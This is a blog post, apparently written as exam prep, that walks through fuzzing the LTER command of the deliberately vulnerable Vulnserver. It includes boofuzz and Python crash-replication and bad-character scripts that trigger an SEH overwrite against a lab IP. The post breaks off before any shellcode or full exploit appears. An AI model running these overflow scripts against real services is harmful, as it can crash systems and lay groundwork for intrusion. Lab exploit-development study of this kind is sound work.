---
layout: single
title: CTP/OSCE Prep -- 'LTER' SEH Based Overflow in Vulnserver
date: 2019-5-29
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post, we will be approaching an overflow in the `LTER` parameter trying to utilize all the tricks we've learned thus far. 

If you have not already done so, please read some of the posts in the 'CTP/OSCE Prep' series as this post will be light on review! 

## Goals

For this post, our goal is to try to utilize all the skills we've gained thus far to exploit Vulnserver in a new way, finding a new vulnerable parameter.

## Fuzzing

I tried to go sequentially through the parameters and find one I could fuzz which would make the application crash but none of the first few parameters would actually crash the server. I then picked some at random and struck out there as well. After this excercise, I'm going to have to go back and check people's walkthroughs and see if there is a problem with my Fuzzing methodology and I'm missing vulnerable params. Finally, I fuzzed `LTER` and got the server to crash. Loading it up in Immunity it looked to be an SEH overwrite, we've prepared for this!

The final `boofuzz` script I used looked like this:
```python
#!/usr/bin/python

from boofuzz import *

host = '192.168.1.201'	#windows VM
port = 9999		#vulnserver port

def main():
	
	session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))
	
	s_initialize("LTER")	#just giving our session a name, "LTER"

    	s_string("LTER", fuzzable = False)	#these strings are fuzzable by default, so here instead of blank, we specify 'false'
    	s_delim(" ", fuzzable = False)		#we don't want to fuzz the space between "LTER" and our arg
   	s_string("FUZZ")			#This value is arbitrary as we did not specify 'False' for fuzzable. Boofuzz will fuzz this string now
 
        session.connect(s_get("LTER"))		#having our 'session' variable connect following the guidelines we established in "LTER"
    	session.fuzz()				#calling this function actually performs the fuzzing

if __name__ == "__main__":
    main()
```

## The Crash!

![](/assets/images/CTP/LTERcrash.JPG)

The first things I noted in Immunity when the server crashed:
+ We are being prompted by Immunity to pass an exception to the program,
+ We have overwritten ECX and EBP, 
+ The stack shows us that `01B4F1F0` and `01B4F1F4` hold `"LTER /.../BBBB..."`

Where do we go from here? Well, we know that having control of the registers is great; however, since we're going to have to pass an exception to this program, and we don't have control of EIP, these registers will be `XOR` against themselves and zeroed out. So the registers are dead to us. 

We definitely want to use the feedback we got from the stack readout where we saw `"LTER /.../BBBB..."`, we will hardcode this into our exploit script. 

The next step we want to do is track down exactly how many bytes `boofuzz` sent and since we know we filled the registers with `B` values, it shouldn't be too hard to track down the exact payload the fuzzer sent. 

## Replicating the Crash

Examining the CLI output from `boofuzz`,

![](/assets/images/CTP/LTERboo.JPG)

We find that in our third payload we sent 5012 bytes and they were all `B` values prepended by `LTER /.../`. So let's hardcode this into our `exploit.py` and see if we can get the program to crash without the fuzzer. This is our exploit script at this point:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = "A" * 5012

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

And we get it to crash, awesome

![](/assets/images/CTP/LTERreplicate.JPG)

Let's look at the SEH chain!

![](/assets/images/CTP/SEHLTER.JPG)

Awesome, we've managed to overwrite both of the SEH components, we can probably control the execution now. But, before we get carried away, we have two outstanding tasks:
1. Determine bad chars,
2. Calculate the offset to the SEH components (remember, they are separated by 4 bytes). 

## Determining Bad Characters

Let's cram the badchars variable into our `A` buffer since, judging by the stack output we get from Immunity, that space is huge. Our exploit code at this point will look like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = badchars
buffer += "A" * (5012 - len(badchars))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Once we send this and the application crashes, we have to select one of the overwritten registers, I used EBP, and then right-click > follow in dump. We see that every thing was going really well until we hit `7F` since it doesn't appear after we hit `6F`. Let's take this character out and send it back through. 

![](/assets/images/CTP/LTERBadchars1.JPG)

A nice thing we should start doing to help ourselves is to comment our python code. We'll make note of: 
+ bad chars, 
+ opcode meanings for jump codes,
+ shellcode lengths, and
+ egghunter lengths (if needed). 

Our exploit code now looks like this:







## Big Thanks

To everyone who has published free intro-level 32 bit exploit dev material, I'm super appreciative. Truly mean it. 
